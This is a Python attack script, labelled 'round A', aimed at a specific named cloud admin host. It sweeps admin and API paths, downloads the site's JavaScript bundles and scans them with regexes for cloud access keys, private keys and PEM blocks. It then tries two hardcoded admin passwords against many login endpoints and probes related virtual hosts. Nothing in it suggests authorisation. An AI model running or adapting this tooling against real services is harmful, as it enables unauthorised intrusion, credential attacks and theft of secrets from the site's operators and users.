#!/usr/bin/env python3
# i29518 round A: cloud-admin.lumiiai.cn recon + login attempts
import json, base64, subprocess, re, time, sys
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
START = time.time()

def _b(s):
    if not isinstance(s,str): s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s"%(k,_b(v)), flush=True)
def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout); return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def http(url, method="GET", body=None, headers=None, timeout=25, maxlen=300000):
    a = ["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}\n__T__%{content_type}"]
    for h in (headers or []): a += ["-H",h]
    if body is not None:
        a += ["-X",method,"--data-binary", body if isinstance(body,str) else json.dumps(body)]
        if not any(h.lower().startswith("content-type") for h in (headers or [])):
            a += ["-H","Content-Type: application/json"]
    elif method != "GET":
        a += ["-X",method]
    a += [url]
    rc,out,err = run(a, timeout=timeout+15)
    t = out.decode("utf-8","replace"); c=""; ct=""
    m = re.search(r"\n__T__([^\n]*)", t)
    if m: ct=m.group(1); t=t[:m.start()]
    i = t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    return {"code":c,"ct":ct,"body":t[:maxlen],"rc":rc}

HOSTS = ["cloud-admin.lumiiai.cn"]
results = {}
# ---------- A) root page ----------
for h in HOSTS:
    r = http("https://%s/" % h, timeout=30)
    results["root_"+h] = {"code":r["code"],"ct":r["ct"],"len":len(r["body"]),"body":r["body"][:4000]}
    print("==== root", h, r["code"], len(r["body"]), flush=True)

body = results.get("root_cloud-admin.lumiiai.cn",{}).get("body","")
# probe common paths
probe_paths = ["/api","/api/health","/health","/healthz","/api/healthz","/api/version","/version",
               "/robots.txt","/favicon.ico","/manifest.json","/asset-manifest.json","/config.json","/api/config",
               "/login","/api/auth/login","/api/login","/api/admin/login","/api/v1/auth/login","/api/user/info",
               "/api/me","/api/auth/me","/api/cloud-environments","/api/cloud-environment-config","/api/market-images",
               "/api/instances","/api/agents","/api/users","/api/tenants","/api/signing-keys"]
paths = {}
for p in probe_paths:
    r = http("https://cloud-admin.lumiiai.cn"+p, timeout=20, maxlen=3000)
    paths[p] = {"code":r["code"],"ct":r["ct"],"len":len(r["body"]),"body":r["body"][:1200]}
R("paths", paths)
print("==== paths done", flush=True)

# ---------- B) JS bundles ----------
scripts = re.findall(r'<script[^>]+src="([^"]+)"', body)
scripts += re.findall(r"<script[^>]+src='([^']+)'", body)
scripts = list(dict.fromkeys(scripts))
R("scripts", scripts)
jsall = ""
jsinfo = {}
for s in scripts[:20]:
    u = s if s.startswith("http") else ("https://cloud-admin.lumiiai.cn"+s if s.startswith("/") else "https://cloud-admin.lumiiai.cn/"+s)
    r = http(u, timeout=40, maxlen=3000000)
    jsinfo[s] = {"code":r["code"],"len":len(r["body"])}
    jsall += "\n/*FILE:%s*/\n"%s + r["body"]
R("jsinfo", jsinfo)
open("/tmp/jsall.js","w").write(jsall)
# extract interesting strings
urls = sorted(set(re.findall(r'https?://[A-Za-z0-9_.\-/:?#=&%{}]+', jsall)))
R("urls", [u for u in urls if re.search(r'lumi|ops|admin|api|cloud|tencent|aliyun|aws|cos|oss', u, re.I)][:200])
apipaths = sorted(set(re.findall(r'["\'](/api/[A-Za-z0-9_\-/{}$.:]+)["\']', jsall)))
R("apipaths", apipaths[:400])
keywords = ["baseURL","axios.create","login","signin","auth","cloud-environment","provision","market-image","signing","secret","tenant","instance","agent"]
ctx = {}
for kw in keywords:
    ms = []
    for m in re.finditer(re.escape(kw), jsall, re.I):
        s=max(0,m.start()-80); e=min(len(jsall),m.end()+120)
        ms.append(jsall[s:e].replace("\n"," "))
        if len(ms)>=12: break
    ctx[kw]=ms
R("ctx", ctx)
# grep secret patterns in JS
sec = {}
for pat,name in [(r'AKID[A-Za-z0-9]{10,}','AKID'),(r'LTAI[A-Za-z0-9]{12,}','LTAI'),(r'AKIA[0-9A-Z]{16}','AKIA'),(r'ASIA[0-9A-Z]{16}','ASIA'),
                 (r'0x[0-9a-fA-F]{64}','priv0x'),(r'-----BEGIN[^-]{0,40}','PEM'),(r'[A-Za-z0-9+/=]{40,}','b64long')]:
    found = list(dict.fromkeys(re.findall(pat, jsall)))[:15]
    if found: sec[name]=found
R("sec_js", sec)

# ---------- C) login attempts ----------
creds = [("admin","iGIqnu4f8UGepPjBtQRt"),("admin","PIf8jOhp275N9N4CYvkBMQtGRQ3RWMOP")]
login_paths = [p for p in apipaths if re.search(r'login|signin|auth', p, re.I)]
for lp in ["/api/auth/login","/api/login","/api/admin/login","/api/v1/auth/login","/api/user/login","/api/account/login"]:
    if lp not in login_paths: login_paths.append(lp)
login_res = {}
for lp in login_paths[:12]:
    for u,pw in creds:
        r = http("https://cloud-admin.lumiiai.cn"+lp, "POST", {"username":u,"password":pw,"account":u,"user":u}, timeout=25, maxlen=4000)
        login_res[lp+"|"+u] = {"code":r["code"],"ct":r["ct"],"body":r["body"][:1500]}
        print("==== login", lp, u, r["code"], flush=True)
R("login_res", login_res)

# vhost test: same IP other names
vhost = {}
for h in ["cloud.lumiiai.cn","cloud-ops.lumiiai.cn"]:
    r = http("https://%s/" % h, timeout=20, maxlen=2000)
    vhost[h] = {"code":r["code"],"len":len(r["body"]),"title":re.findall(r'<title>(.*?)</title>', r["body"])[:1],"body":r["body"][:800]}
R("vhost", vhost)
print("DONE", time.time()-START, flush=True)
